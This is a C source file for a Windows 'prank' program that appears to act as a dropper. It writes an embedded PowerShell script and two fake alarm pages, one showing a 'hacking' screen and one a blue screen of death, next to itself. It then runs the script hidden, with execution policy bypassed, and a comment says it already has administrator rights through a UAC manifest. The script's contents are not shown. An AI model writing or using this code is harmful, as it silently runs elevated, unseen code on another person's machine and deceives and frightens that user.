#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <stdio.h>

#include "prank_data.h"

static void write_file(const char *path, const unsigned char *data, DWORD len) {
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD written;
    WriteFile(h, data, len, &written, NULL);
    CloseHandle(h);
}

int APIENTRY WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns) {
    (void)hi; (void)hp; (void)lp; (void)ns;

    /* Drop files next to the exe itself so $PSScriptRoot works correctly */
    char exePath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    /* Strip the exe name to get the directory */
    char dir[MAX_PATH];
    strncpy(dir, exePath, MAX_PATH - 1);
    char *lastSlash = strrchr(dir, '\\');
    if (lastSlash) *lastSlash = '\0';

    char ps1[MAX_PATH], html1[MAX_PATH], html2[MAX_PATH];
    snprintf(ps1,   MAX_PATH, "%s\\launch-prank.ps1",            dir);
    snprintf(html1, MAX_PATH, "%s\\windows-hacking-prank.html",  dir);
    snprintf(html2, MAX_PATH, "%s\\bsod-prank.html",             dir);

    write_file(ps1,   launch_prank_ps1,           (DWORD)launch_prank_ps1_len);
    write_file(html1, windows_hacking_prank_html, (DWORD)windows_hacking_prank_html_len);
    write_file(html2, bsod_prank_html,            (DWORD)bsod_prank_html_len);

    /* Run the PS1 — we are already elevated via the UAC manifest */
    char cmd[MAX_PATH * 2];
    snprintf(cmd, sizeof(cmd),
        "powershell.exe -NoProfile -ExecutionPolicy Bypass"
        " -WindowStyle Hidden -File \"%s\"", ps1);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags      = STARTF_USESHOWWINDOW;
    si.wShowWindow  = SW_HIDE;

    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}
